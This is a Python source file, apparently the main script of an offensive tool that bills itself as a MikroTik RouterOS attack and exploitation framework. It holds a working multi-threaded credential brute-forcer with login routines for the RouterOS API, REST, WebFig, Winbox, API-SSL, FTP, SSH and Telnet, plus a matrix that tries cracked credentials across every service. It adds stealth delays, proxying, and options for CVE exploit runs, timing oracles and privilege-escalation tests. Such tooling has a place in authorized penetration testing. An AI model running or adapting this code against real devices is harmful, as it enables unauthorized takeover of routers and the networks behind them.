#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: André Henrique (LinkedIn/X: @mrhenrike)
# Version: see version.py (canonical source — never hardcode here)

"""
MikrotikAPI-BF — RouterOS Attack & Exploitation Framework
===========================================================
Performs credential brute-force, fingerprinting, and vulnerability
assessment against MikroTik RouterOS devices.

Quick start:
  python mikrotikapi-bf.py -t 192.168.1.1 -U admin -P admin123
  python mikrotikapi-bf.py -t 192.168.1.1 -d wordlists/combos.lst
  python mikrotikapi-bf.py -t 192.168.1.1 --exploit --fingerprint
  python mikrotikapi-bf.py --interactive
"""

import sys

# ── Load .env if present (python-dotenv, optional dep) ───────────────────
try:
    from dotenv import load_dotenv
    load_dotenv(override=False)  # .env values do NOT override existing env vars
except ImportError:
    pass  # python-dotenv not installed; .env not loaded (install with: pip install python-dotenv)

# ── Python version guard (3.8+ required, no upper cap) ────────────────────
_MIN = (3, 8)
if sys.version_info[:2] < _MIN:
    print(f"\n[ERROR] Python {'.'.join(map(str, _MIN))}+ required "
          f"(running {sys.version.split()[0]}).\n")
    sys.exit(1)

import argparse
import concurrent.futures
import json
import socket
import struct
import threading
import time
import warnings
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple

import requests
import urllib3
from requests.auth import HTTPBasicAuth

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Package imports ───────────────────────────────────────────────────────

def _import_core():
    """Import core modules; raise ImportError with a clear message on failure."""
    try:
        from core.api import Api
        from core.log import Log
        from core.session import SessionManager
        from core.export import ResultExporter
        from core.progress import ProgressBar
        from core.cli import PentestCLI
        return Api, Log, SessionManager, ResultExporter, ProgressBar, PentestCLI
    except ImportError as exc:
        print(f"[ERROR] Could not import core modules: {exc}")
        print("Ensure you are running from the MikrotikAPI-BF directory.")
        sys.exit(1)


def _import_modules():
    """Import optional feature modules (graceful fallback to None)."""
    mods: Dict = {}
    pairs = [
        ("StealthManager",       "modules.stealth",      "StealthManager"),
        ("MikrotikFingerprinter","modules.fingerprint",  "MikrotikFingerprinter"),
        ("SmartWordlistManager", "modules.wordlists",    "SmartWordlistManager"),
        ("ProxyManager",         "modules.proxy",        "ProxyManager"),
    ]
    for key, mod_path, cls_name in pairs:
        try:
            import importlib
            mod = importlib.import_module(mod_path)
            mods[key] = getattr(mod, cls_name)
        except Exception:
            mods[key] = None
    return mods


Api, Log, SessionManager, ResultExporter, ProgressBar, PentestCLI = _import_core()
_mods = _import_modules()
StealthManager        = _mods["StealthManager"]
MikrotikFingerprinter = _mods["MikrotikFingerprinter"]
SmartWordlistManager  = _mods["SmartWordlistManager"]
ProxyManager          = _mods["ProxyManager"]

from version import _VERSION  # canonical source — edit version.py to bump

# ── Telnet fallback (removed from stdlib in Python 3.13) ─────────────────

def _telnet_login(host: str, username: str, password: str, port: int = 23) -> bool:
    """Socket-based Telnet login that works on all Python versions."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))

        def _read_until(needle: bytes, timeout: float = 5.0) -> bytes:
            buf = b""
            deadline = time.time() + timeout
            while time.time() < deadline:
                try:
                    chunk = sock.recv(256)
                    if not chunk:
                        break
                    buf += chunk
                    if needle in buf:
                        break
                except socket.timeout:
                    break
            return buf

        _read_until(b"ogin:")
        sock.sendall(username.encode("ascii", errors="replace") + b"\r\n")
        _read_until(b"assword:")
        sock.sendall(password.encode("ascii", errors="replace") + b"\r\n")
        response = _read_until(b">", timeout=3)
        sock.close()
        return b"Login:" not in response and b"incorrect" not in response.lower()
    except Exception:
        return False


# ── Utility functions ─────────────────────────────────────────────────────

def _now() -> str:
    return datetime.now().strftime("%H:%M:%S")


def _port_open(host: str, port: int, timeout: int = 3) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, socket.error, OSError):
        return False


def _rest_login(host: str, username: str, password: str, port: int, use_ssl: bool = False) -> bool:
    protocol = "https" if use_ssl else "http"
    url = f"{protocol}://{host}:{port}/rest/system/identity"
    try:
        resp = requests.get(
            url, auth=HTTPBasicAuth(username, password), timeout=5, verify=False
        )
        return resp.status_code == 200
    except Exception:
        return False


def _ftp_login(host: str, username: str, password: str, port: int = 21) -> bool:
    """Attempt FTP authentication."""
    try:
        import ftplib
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=5)
        ftp.login(username, password)
        ftp.quit()
        return True
    except Exception:
        return False


def _ssh_login(host: str, username: str, password: str, port: int = 22) -> bool:
    """Attempt SSH authentication via paramiko."""
    try:
        import paramiko
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(
            host, port=port, username=username, password=password,
            timeout=5, allow_agent=False, look_for_keys=False,
        )
        ssh.close()
        return True
    except Exception:
        return False


def _http_login(host: str, username: str, password: str, port: int = 80,
                use_ssl: bool = False) -> Tuple[bool, str]:
    """Attempt HTTP/HTTPS WebFig + REST API authentication.

    Returns:
        Tuple of (success, detail_string).
    """
    try:
        import requests as _req
        import urllib3 as _u3
        _u3.disable_warnings()
        scheme = "https" if use_ssl else "http"
        base = f"{scheme}://{host}:{port}"

        # Try REST API (RouterOS 7.x)
        r = _req.get(
            f"{base}/rest/system/resource",
            auth=(username, password), timeout=5, verify=False,
        )
        if r.status_code == 200:
            info = r.json()
            ver = info.get("version", "?")
            board = info.get("board-name", "?")
            return True, f"REST API OK — RouterOS {ver} | {board}"
        if r.status_code == 401:
            return False, "REST API: credentials rejected (HTTP 401)"

        # RouterOS 6.x WebFig — try jsproxy login
        try:
            s = _req.Session()
            s.get(f"{base}/", timeout=4, verify=False)
            r2 = s.post(
                f"{base}/jsproxy",
                json={"method": "login", "params": [username, password]},
                timeout=4, verify=False,
            )
            if r2.status_code == 200 and "error" not in r2.text.lower():
                return True, "WebFig jsproxy login OK"
        except Exception:
            pass

        return False, f"HTTP {r.status_code} — WebFig not responding to credentials"
    except Exception as e:
        return False, f"Connection error: {e}"


def _winbox_login(host: str, username: str, password: str, port: int = 8291) -> Tuple[bool, str]:
    """Attempt Winbox M2 protocol authentication.

    RouterOS 6.x uses MD5 challenge-response over M2 binary protocol.
    RouterOS 7.x uses Curve25519/SRP — not yet implemented here.
    This probe confirms port is open and auth is accepted.

    Returns:
        Tuple of (success, detail_string).
    """
    try:
        import hashlib as _md5
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))

        # Phase 1: Hello / session negotiate
        hello = bytes.fromhex(
            "680c000000ff0106000000000000002200000006ff0901000000"
            "000000002200000007ff090200000000000000"
        )
        s.send(hello)
        time.sleep(0.4)
        resp = b""
        try:
            resp = s.recv(1024)
        except socket.timeout:
            s.close()
            return False, "No response to hello probe"

        if not resp:
            s.close()
            return False, "No response to hello probe"

        # Phase 2: Build login request using MD5(passwd + salt)
        salt = resp[-16:] if len(resp) >= 16 else resp
        pw_b = password.encode("utf-8")
        md5_hash = _md5.md5(pw_b + salt).digest()
        user_b = username.encode("utf-8")

        # M2 login frame
        payload = b"\xfe\x01\x00\x00"
        payload += struct.pack("<H", len(user_b)) + user_b
        payload += md5_hash
        frame = struct.pack("<HH", len(payload) + 4, 0x0001) + payload
        s.send(frame)
        time.sleep(0.4)

        auth_resp = b""
        try:
            auth_resp = s.recv(512)
        except socket.timeout:
            pass
        s.close()

        # Heuristic: a non-error response with content indicates auth accepted
        if auth_resp and b"\xfe\x02" not in auth_resp and len(auth_resp) > 4:
            return True, f"Winbox session established ({len(auth_resp)} bytes)"
        if not auth_resp:
            return False, "No auth response"
        return False, "Winbox auth rejected"
    except Exception as e:
        return False, str(e)


def _api_ssl_login(host: str, username: str, password: str, port: int = 8729) -> Tuple[bool, str]:
    """Attempt RouterOS API-SSL (TLS over port 8729) authentication.

    Returns:
        Tuple of (success, detail_string).
    """
    try:
        import ssl as _ssl
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE

        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(5)
        raw.connect((host, port))
        s = ctx.wrap_socket(raw, server_hostname=host)

        def _enc(w: str) -> bytes:
            b = w.encode("utf-8")
            l = len(b)
            if l < 0x80:
                return bytes([l]) + b
            return bytes([((l >> 8) & 0xFF) | 0x80, l & 0xFF]) + b

        # RouterOS 7.x direct plaintext login
        s.send(_enc("/login") + _enc(f"=name={username}") + _enc(f"=password={password}") + b"\x00")
        s.settimeout(3)
        data = b""
        try:
            while True:
                c = s.recv(256)
                if not c:
                    break
                data += c
        except socket.timeout:
            pass
        s.close()

        text = data.decode("utf-8", errors="replace")
        if "!done" in text and "!trap" not in text:
            return True, "API-SSL login OK (RouterOS 7.x direct)"
        if "=ret=" in text:
            # RouterOS 6.x MD5 challenge received — attempt response
            import re as _re, hashlib as _h
            m = _re.search(r"=ret=([0-9a-f]+)", text)
            if m:
                chal = bytes.fromhex(m.group(1))
                pw_b = password.encode("utf-8")
                digest = "00" + _h.md5(b"\x00" + pw_b + chal).hexdigest()
                s2 = ctx.wrap_socket(
                    socket.create_connection((host, port), timeout=5),
                    server_hostname=host,
                )
                s2.send(
                    _enc("/login") + _enc(f"=name={username}") + _enc(f"=response={digest}") + b"\x00"
                )
                s2.settimeout(3)
                data2 = b""
                try:
                    while True:
                        c = s2.recv(256)
                        if not c:
                            break
                        data2 += c
                except socket.timeout:
                    pass
                s2.close()
                text2 = data2.decode("utf-8", errors="replace")
                if "!done" in text2 and "!trap" not in text2:
                    return True, "API-SSL login OK (RouterOS 6.x MD5 challenge)"
        return False, "API-SSL auth rejected"
    except Exception as e:
        return False, str(e)


def _credential_matrix(
    target: str,
    username: str,
    password: str,
    http_port: int = 80,
    api_port: int = 8728,
    ssl_port: int = 443,
    timeout: float = 5.0,
) -> Dict[str, Dict]:
    """Test credentials against ALL RouterOS services and return a matrix.

    Probes all standard MikroTik service ports, then tests the given
    credentials against each open service.

    Args:
        target: Target IP address.
        username: Credential username.
        password: Credential password.
        http_port: HTTP/WebFig port (default 80).
        api_port: RouterOS binary API port (default 8728).
        ssl_port: HTTPS port (default 443).
        timeout: Per-service connection timeout.

    Returns:
        Dict mapping service name to result dict with keys:
        port, open, success, detail.
    """
    ALL_SERVICES: Dict[str, int] = {
        "ftp":      21,
        "ssh":      22,
        "telnet":   23,
        "http":     http_port,
        "https":    ssl_port,
        "api":      api_port,
        "winbox":   8291,
        "api-ssl":  8729,
    }

    SEP = "═" * 60

    print(f"\n{SEP}")
    print(f"  CREDENTIAL MATRIX — {target}")
    print(f"  User: {username!r}  Pass: {password!r}")
    print(SEP)

    matrix: Dict[str, Dict] = {}

    for svc, port in ALL_SERVICES.items():
        # Fast port probe first
        is_open = _port_open(target, port)
        status = "CLOSED"
        detail = ""
        success = False

        if is_open:
            try:
                if svc == "ftp":
                    success = _ftp_login(target, username, password, port)
                    detail = "FTP login OK" if success else "FTP credentials rejected"
                elif svc == "ssh":
                    success = _ssh_login(target, username, password, port)
                    detail = "SSH login OK" if success else "SSH credentials rejected"
                elif svc == "telnet":
                    success = _telnet_login(target, username, password, port)
                    detail = "Telnet login OK" if success else "Telnet credentials rejected"
                elif svc == "http":
                    success, detail = _http_login(target, username, password, port, use_ssl=False)
                elif svc == "https":
                    success, detail = _http_login(target, username, password, port, use_ssl=True)
                elif svc == "api":
                    try:
                        from core.api import Api
                        api = Api(target, port=port, timeout=int(timeout))
                        success = api.login(username, password)
                        detail = "Binary API login OK" if success else "Binary API credentials rejected"
                    except Exception as e:
                        detail = f"API error: {e}"
                elif svc == "winbox":
                    success, detail = _winbox_login(target, username, password, port)
                elif svc == "api-ssl":
                    success, detail = _api_ssl_login(target, username, password, port)
            except Exception as e:
                detail = f"Error: {e}"

            status = "ACCESS" if success else "DENIED"
        else:
            detail = "port closed"

        matrix[svc] = {
            "port": port,
            "open": is_open,
            "success": success,
            "detail": detail,
        }

        icon = "✓" if success else ("○" if not is_open else "✗")
        tag  = f"[\033[32mACCESS\033[0m]" if success else (f"[CLOSED]" if not is_open else f"[\033[31mDENIED\033[0m]")
        print(f"  {icon} {tag} {svc.upper():<8} :{port:<5}  {detail[:55]}")

    accessible = [s for s, r in matrix.items() if r["success"]]
    print(SEP)
    if accessible:
        print(f"  ACCESSIBLE SERVICES: {', '.join(s.upper() for s in accessible)}")
    else:
        print(f"  No services accessible with these credentials.")
    print(SEP)

    return matrix


def _scan_services(target: str, api_port: int, http_port: int, ssl_port: int, use_ssl: bool) -> Dict[str, bool]:
    """Probe all standard MikroTik service ports in parallel."""
    import concurrent.futures as _cf

    print("\n" + "═" * 60)
    print("  TARGET SERVICE DISCOVERY")
    print("═" * 60)
    print(f"  Target: {target}")

    probe_map: Dict[str, int] = {
        "api":     api_port,
        "http":    http_port,
        "winbox":  8291,
        "ssh":     22,
        "ftp":     21,
        "telnet":  23,
        "api-ssl": 8729,
        "https":   ssl_port,
    }

    with _cf.ThreadPoolExecutor(max_workers=len(probe_map)) as ex:
        results_fut = {svc: ex.submit(_port_open, target, port) for svc, port in probe_map.items()}
    services = {svc: fut.result() for svc, fut in results_fut.items()}

    icons = {"open": "✓ OPEN", "closed": "✗ CLOSED"}
    for svc, port in probe_map.items():
        label = f"{svc.upper():<8} ({port:>5})"
        state = icons["open"] if services[svc] else icons["closed"]
        print(f"  {label}  : {state}")
    print("═" * 60)
    return services


# ── Bruteforce Engine ─────────────────────────────────────────────────────

class BruteforceEngine:
    """
    Multi-threaded credential brute-force engine for MikroTik RouterOS.

    Supports RouterOS API (8728), REST API (HTTP/HTTPS), FTP, SSH, and Telnet.
    """

    def __init__(
        self,
        target: str,
        usernames: Optional[str],
        passwords: Optional[str],
        combo_dict: Optional[str],
        delay: float,
        api_port: int = 8728,
        rest_port: int = 8729,
        http_port: int = 80,
        ssl_port: int = 443,
        use_ssl: bool = False,
        max_workers: int = 2,
        verbose: bool = False,
        verbose_all: bool = False,
        validate_services: Optional[Dict[str, Optional[int]]] = None,
        services_ok: Optional[Dict[str, bool]] = None,
        show_progress: bool = False,
        proxy_url: Optional[str] = None,
        export_formats: Optional[List[str]] = None,
        export_dir: str = "results",
        max_retries: int = 1,
        stealth_mode: bool = False,
        fingerprint: bool = False,
        session_manager: Optional[SessionManager] = None,
        resume_session: bool = False,
        force_new_session: bool = False,
    ) -> None:
        self.target = target
        self.api_port = api_port
        self.rest_port = rest_port
        self.http_port = http_port
        self.ssl_port = ssl_port
        self.use_ssl = use_ssl
        self.delay = delay
        self.max_workers = min(max(1, max_workers), 300)
        self.verbose = verbose
        self.verbose_all = verbose_all
        self.validate_services = validate_services or {}
        self.services_ok = services_ok or {}
        self.show_progress = show_progress
        self.proxy_url = proxy_url
        self.export_formats = export_formats or []
        self.export_dir = export_dir
        self.max_retries = max_retries
        self.stealth_mode = stealth_mode
        self.do_fingerprint = fingerprint

        # Session management
        self.session_manager = session_manager
        self.resume_session = resume_session
        self.force_new = force_new_session
        self.session_id: Optional[str] = None

        # Runtime state
        self.log = Log(verbose=verbose, verbose_all=verbose_all)
        self.wordlist: List[Tuple[str, str]] = []
        self.successes: List[Dict] = []
        self._lock = threading.Lock()
        self._idx_lock = threading.Lock()
        self._index = 0
        self._progress: Optional[ProgressBar] = None

        # Optional modules
        self.stealth_mgr = StealthManager(enabled=stealth_mode) if StealthManager else None
        self.fingerprinter = MikrotikFingerprinter() if MikrotikFingerprinter else None
        self.proxy_mgr: Optional[ProxyManager] = None

        if proxy_url and ProxyManager:
            pm = ProxyManager(proxy_url)
            if pm.test_connection():
                self.proxy_mgr = pm
                self.log.info(f"[PROXY] Active: {proxy_url}")
            else:
                self.log.warning("[PROXY] Unreachable — disabled.")

        # Load the wordlist (and optionally resume a session)
        self._raw_users = usernames
        self._raw_pwds = passwords
        self._combo_dict = combo_dict
        self._load_wordlist()

    # ------------------------------------------------------------------
    # Wordlist loading
    # ------------------------------------------------------------------

    def _load_wordlist(self) -> None:
        # Session resume check
        if self.session_manager and not self.force_new:
            existing = self.session_manager.find_existing_session(
                self.target, list(self.validate_services.keys()) or ["api"], []
            )
            if existing and self.resume_session and self.session_manager.should_resume(existing):
                self.log.info(f"[SESSION] Resuming {existing['session_id']}")
                self.session_id = existing["session_id"]
                self.wordlist = [
                    (c[0], c[1]) for c in existing.get("wordlist", [])
                    if isinstance(c, (list, tuple)) and len(c) == 2
                ]
                self._index = existing.get("tested_combinations", 0)
                self.successes = existing.get("successful_credentials", [])
                return
            if existing and existing.get("status") == "completed":
                self.log.info("[SESSION] Already completed.")
                for c in existing.get("successful_credentials", []):
                    self.log.success(f"[SESSION] {c.get('user')}:{c.get('pass')}")
                self.wordlist = []
                return

        # Build wordlist from arguments
        combos: List[Tuple[str, str]] = []
        if self._combo_dict:
            combos = self._load_combo_file(self._combo_dict)
        elif self._raw_users or self._raw_pwds:
            users = self._load_list_or_single(self._raw_users)
            pwds = self._load_list_or_single(self._raw_pwds)
            if not users:
                users = ["admin"]
            if pwds is None:
                pwds = [""]
            combos = [(u, p) for u in users for p in pwds]
        else:
            combos = [("admin", "")]

        # Deduplicate preserving order
        seen: set = set()
        self.wordlist = []
        for combo in combos:
            if combo not in seen:
                seen.add(combo)
                self.wordlist.append(combo)

        # Create session
        if self.session_manager and not self.session_id:
            self.session_id = self.session_manager.create_session(
                self.target,
                list(self.validate_services.keys()) or ["api"],
                self.wordlist,
                {
                    "api_port": self.api_port,
                    "http_port": self.http_port,
                    "delay": self.delay,
                    "stealth": self.stealth_mode,
                },
            )
            self.log.info(f"[SESSION] Created: {self.session_id}")

    @staticmethod
    def _load_combo_file(path: str) -> List[Tuple[str, str]]:
        combos: List[Tuple[str, str]] = []
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as fh:
                for line in fh:
                    line = line.strip()
                    if ":" in line:
                        user, _, pwd = line.partition(":")
                        combos.append((user, pwd))
        except Exception as exc:
            print(f"[ERROR] Could not read combo file {path}: {exc}")
            sys.exit(1)
        return combos

    @staticmethod
    def _load_list_or_single(value: Optional[str]) -> Optional[List[str]]:
        if not value:
            return None
        if Path(value).is_file():
            with open(value, "r", encoding="utf-8", errors="replace") as fh:
                return [ln.strip() for ln in fh if ln.strip()]
        return [value]

    # ------------------------------------------------------------------
    # Worker thread
    # ------------------------------------------------------------------

    def _next_combo(self) -> Optional[Tuple[str, str]]:
        with self._idx_lock:
            if self._index >= len(self.wordlist):
                return None
            combo = self.wordlist[self._index]
            self._index += 1
            return combo

    def _worker(self) -> None:
        tid = threading.get_ident()
        while True:
            combo = self._next_combo()
            if combo is None:
                break
            user, pwd = combo

            # Delay
            if self.stealth_mgr:
                self.stealth_mgr.apply_stealth_for_thread(tid, self.delay)
            else:
                time.sleep(self.delay)

            if self.verbose or self.verbose_all:
                self.log.debug(f"Trying {user}:{pwd}")

            found_services: List[str] = []

            # ── RouterOS API ──────────────────────────────────────────
            if self.services_ok.get("api"):
                try:
                    from core.api import Api as _Api
                    api = _Api(self.target, self.api_port)
                    if api.login(user, pwd):
                        found_services.append("api")
                        self.log.success(f"[API] {user}:{pwd}")
                    elif self.verbose or self.verbose_all:
                        self.log.fail(f"[API] {user}:{pwd}")
                except Exception as exc:
                    if self.verbose_all:
                        self.log.warning(f"[API] Error: {str(exc)[:80]}")

            # ── REST API ──────────────────────────────────────────────
            rest_port = self.ssl_port if self.use_ssl else self.http_port
            if self.services_ok.get("http") or (self.use_ssl and self.services_ok.get("ssl")):
                try:
                    if _rest_login(self.target, user, pwd, rest_port, self.use_ssl):
                        found_services.append("restapi")
                        self.log.success(f"[REST] {user}:{pwd}")
                    elif self.verbose or self.verbose_all:
                        self.log.fail(f"[REST] {user}:{pwd}")
                except Exception as exc:
                    if self.verbose_all:
                        self.log.warning(f"[REST] Error: {exc}")

            # ── Automatic multi-service credential matrix ─────────────
            if found_services:
                matrix = _credential_matrix(
                    target=self.target,
                    username=user,
                    password=pwd,
                    http_port=self.http_port,
                    api_port=self.api_port,
                    ssl_port=self.ssl_port,
                )
                # Merge matrix results into found_services list
                for svc, res in matrix.items():
                    if res["success"] and svc not in found_services:
                        found_services.append(svc)

            # ── Legacy --validate support (backward compat) ───────────
            if found_services and self.validate_services:
                for svc_name, custom_port in self.validate_services.items():
                    if svc_name in found_services:
                        continue  # Already tested by credential_matrix
                    svc_port = custom_port or {"ftp": 21, "ssh": 22, "telnet": 23}.get(svc_name, 0)
                    ok = False
                    try:
                        if svc_name == "ftp":
                            ok = _ftp_login(self.target, user, pwd, svc_port)
                        elif svc_name == "ssh":
                            ok = _ssh_login(self.target, user, pwd, svc_port)
                        elif svc_name == "telnet":
                            ok = _telnet_login(self.target, user, pwd, svc_port)
                    except Exception:
                        pass
                    if ok:
                        found_services.append(svc_name)
                        self.log.success(f"[{svc_name.upper()}] {user}:{pwd}")

            # ── Record success ────────────────────────────────────────
            if found_services:
                with self._lock:
                    self.successes.append(
                        {"user": user, "pass": pwd, "services": found_services, "target": self.target}
                    )
                if self._progress:
                    self._progress.update(1, success=True)
            else:
                if self._progress:
                    self._progress.update(1)

            # ── Update session every 10 attempts ─────────────────────
            if self.session_manager and self.session_id and (self._index % 10 == 0 or found_services):
                self.session_manager.update_session(
                    self.session_id, self._index, self.successes, [], combo
                )

    # ------------------------------------------------------------------
    # Main run
    # ------------------------------------------------------------------

    def run(self) -> List[Dict]:
        """Start the brute-force attack and return successful credentials."""
        if not self.wordlist:
            self.log.info("[*] Nothing to test — wordlist is empty.")
            return []

        # Attack configuration header
        print("\n" + "═" * 60)
        print("  ATTACK CONFIGURATION  v" + _VERSION)
        print("═" * 60)
        print(f"  Target          : {self.target}")
        print(f"  API Port        : {self.api_port}")
        print(f"  HTTP Port       : {self.http_port}")
        print(f"  SSL             : {'ON' if self.use_ssl else 'OFF'}")
        print(f"  Threads         : {self.max_workers}")
        print(f"  Delay           : {self.delay}s")
        print(f"  Total Combos    : {len(self.wordlist)}")
        print(f"  Stealth Mode    : {'ON' if self.stealth_mode else 'OFF'}")
        print(f"  Fingerprinting  : {'ON' if self.do_fingerprint else 'OFF'}")
        if self.proxy_mgr:
            print(f"  Proxy           : {self.proxy_url}")
        if self.validate_services:
            print(f"  Validation      : {', '.join(self.validate_services).upper()}")
        if self.export_formats:
            print(f"  Export          : {', '.join(self.export_formats).upper()}")
        print("═" * 60 + "\n")

        # Proxy setup
        if self.proxy_mgr:
            self.proxy_mgr.setup_socket()

        # Fingerprint
        if self.do_fingerprint and self.fingerprinter:
            self.log.info("[FINGERPRINT] Analysing target…")
            fp_info = self.fingerprinter.fingerprint_device(self.target)
            if fp_info.get("is_mikrotik"):
                ver = fp_info.get("routeros_version") or "Unknown"
                risk = fp_info.get("risk_score", 0)
                self.log.success(f"[FINGERPRINT] MikroTik confirmed — RouterOS {ver} — Risk {risk:.1f}/10")
            else:
                self.log.warning("[FINGERPRINT] Target may not be a MikroTik device.")

        self.log.info(f"[*] Testing {len(self.wordlist)} combination(s) with {self.max_workers} thread(s)…")

        # Progress bar
        if self.show_progress:
            self._progress = ProgressBar(len(self.wordlist), show_eta=True, show_speed=True)

        start = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as pool:
            futures = [pool.submit(self._worker) for _ in range(self.max_workers)]
            concurrent.futures.wait(futures)

        elapsed = time.time() - start

        if self._progress:
            self._progress.finish()

        # Restore proxy
        if self.proxy_mgr:
            self.proxy_mgr.restore_socket()

        # Final session update
        if self.session_manager and self.session_id:
            self.session_manager.complete_session(self.session_id, self.successes)

        # Statistics
        total = len(self.wordlist)
        found = len(self.successes)
        print("\n" + "═" * 60)
        print("  ATTACK STATISTICS")
        print("═" * 60)
        print(f"  Total Tested    : {total}")
        print(f"  Successful      : {found}")
        print(f"  Failed          : {total - found}")
        rate = found / total * 100 if total else 0
        print(f"  Success Rate    : {rate:.1f}%")
        print(f"  Elapsed         : {elapsed:.1f}s")
        if total and elapsed:
            print(f"  Speed           : {total/elapsed:.2f} att/s")
        print("═" * 60)

        # Results
        if self.successes:
            deduped = list({(d["user"], d["pass"]): d for d in self.successes}.values())
            print("\n" + "═" * 70)
            print("  ✓  CREDENTIALS EXPOSED")
            print("═" * 70)
            print(f"  {'#':<4}  {'USERNAME':<24}  {'PASSWORD':<24}  SERVICES")
            print("  " + "─" * 66)
            for i, d in enumerate(deduped, 1):
                svcs = ", ".join(d["services"])
                print(f"  {i:04}  {d['user']:<24}  {d['pass']:<24}  {svcs}")
            print("═" * 70 + "\n")

            # Export
            if self.export_formats and ResultExporter:
                exporter = ResultExporter(deduped, self.target, output_dir=self.export_dir)
                for fmt in self.export_formats:
                    method = getattr(exporter, f"export_{fmt}", None)
                    if method:
                        path = method()
                        self.log.info(f"[EXPORT] {fmt.upper()} → {path}")
        else:
            print("\n  No credentials found.\n")

        return self.successes


# ── Argument parser ────────────────────────────────────────────────────────

def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="mikrotikapi-bf",
        description="MikrotikAPI-BF v" + _VERSION + " — RouterOS Attack & Exploitation Framework",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python mikrotikapi-bf.py -t 192.168.1.1 -U admin -P admin\n"
            "  python mikrotikapi-bf.py -t 192.168.1.1 -d wordlists/combos.lst --stealth\n"
            "  python mikrotikapi-bf.py -t 192.168.1.1 --exploit --fingerprint\n"
            "  python mikrotikapi-bf.py -t 192.168.1.1 --run-exploit CVE-2018-14847\n"
            "  python mikrotikapi-bf.py -t 192.168.1.1 --audit --export sarif\n"
            "  python mikrotikapi-bf.py --interactive\n"
        ),
    )

    # Target
    p.add_argument("-t", "--target", metavar="IP", help="Target IP or hostname")

    # Credentials
    cred = p.add_argument_group("Credentials")
    cred.add_argument("-U", "--user",       default="admin",  help="Single username (default: admin)")
    cred.add_argument("-P", "--passw",      metavar="PASS",   help="Single password")
    cred.add_argument("-u", "--userlist",   metavar="FILE",   help="Username wordlist file")
    cred.add_argument("-p", "--passlist",   metavar="FILE",   help="Password wordlist file")
    cred.add_argument("-d", "--dictionary", metavar="FILE",   help="Combo file (user:pass format)")

    # Timing
    timing = p.add_argument_group("Timing & Threads")
    timing.add_argument(
        "--delay-mode",
        choices=("high", "balanced", "stealth", "custom"),
        default="high",
        help=(
            "Delay profile between attempts. "
            "'high' keeps requests aggressive for rate-limit validation "
            "(default), 'custom' uses --seconds."
        ),
    )
    timing.add_argument(
        "-s", "--seconds",
        type=float,
        default=None,
        metavar="N",
        help="Custom delay in seconds (used with --delay-mode custom).",
    )
    timing.add_argument("--threads", type=int, default=2, metavar="N",
                        help="Thread count (default: 2, max: 300). "
                             "Values > 15 require --high-threads acknowledgement. "
                             "High counts stress CPU/RAM and the target network.")
    timing.add_argument(
        "--high-threads",
        action="store_true",
        help="Acknowledge the risk disclaimer for --threads > 15 (up to 300 max). "
             "High thread counts may exhaust local RAM/CPU, saturate the target's "
             "API service, generate noisy logs, and trigger network-level blocks. "
             "USE AT YOUR OWN RISK on authorized targets only.",
    )

    # Ports
    ports = p.add_argument_group("Ports & Protocol")
    ports.add_argument("--api-port",  type=int, default=8728, help="RouterOS API port (8728)")
    ports.add_argument("--rest-port", type=int, default=8729, help="RouterOS REST port (8729)")
    ports.add_argument("--http-port", type=int, default=80,   help="HTTP port (80)")
    ports.add_argument("--ssl",       action="store_true",    help="Use HTTPS for REST API")
    ports.add_argument("--ssl-port",  type=int, default=443,  help="HTTPS port (443)")

    # Validation
    p.add_argument("--validate", metavar="SERVICES",
                   help="Post-login validation services: ftp,ssh,telnet or ftp=2121,ssh=2222")

    # Output
    out = p.add_argument_group("Output")
    out.add_argument("-v",   "--verbose",     action="store_true", help="Show failed attempts")
    out.add_argument("-vv",  "--verbose-all", action="store_true", help="Full debug output")
    out.add_argument("--progress",            action="store_true", help="Show progress bar with ETA")

    # Features
    feat = p.add_argument_group("Features")
    feat.add_argument("--stealth",      action="store_true", help="Enable stealth delays & UA rotation")
    feat.add_argument("--fingerprint",  action="store_true", help="Run advanced device fingerprinting")
    feat.add_argument("--exploit",      action="store_true", help="Run exploit/CVE scanner after BF")
    feat.add_argument("--scan-cve",     action="store_true", help="Fingerprint target and run all applicable CVE PoCs")
    feat.add_argument("--all-cves",     action="store_true", help="Show ALL CVEs regardless of version (with --scan-cve)")
    feat.add_argument("--run-exploit",  metavar="CVE_ID",    help="Run a specific exploit check by ID (e.g. CVE-2018-14847)")
    feat.add_argument("--audit",        action="store_true", help="Run full 8-phase security audit via REST API")
    feat.add_argument("--audit-report", metavar="DIR", default="results", help="Output dir for audit report (default: results)")
    feat.add_argument("--timing-oracle", action="store_true", help="Run timing oracle test (length + char probe)")
    feat.add_argument("--privesc-test", action="store_true", help="Run low-impact privilege escalation test matrix")
    feat.add_argument("--cli-timing", action="store_true", help="Run multi-channel CLI timing collection")
    feat.add_argument("--timing-samples", type=int, default=100, metavar="N", help="Samples per candidate (default: 100)")
    feat.add_argument(
        "--timing-charset",
        choices=["alphanum", "printable", "full"],
        default="alphanum",
        help="Charset for timing char probe (default: alphanum)",
    )
    feat.add_argument("--timing-length", type=int, metavar="N", help="Fixed length for timing oracle (skip length discovery)")
    feat.add_argument("--timing-api", action="store_true", help="Use binary API (8728) for timing oracle")
    feat.add_argument("--timing-rest", action="store_true", help="Use REST HTTP (80) for timing oracle")
    feat.add_argument("--timing-report", metavar="CSV", help="Write timing distributions to CSV")
    feat.add_argument(
        "--privesc-accounts",
        metavar="LIST",
        help="Accounts for --privesc-test, format: user1:pass1,user2:pass2 "
             "(default uses -U/-P only)",
    )
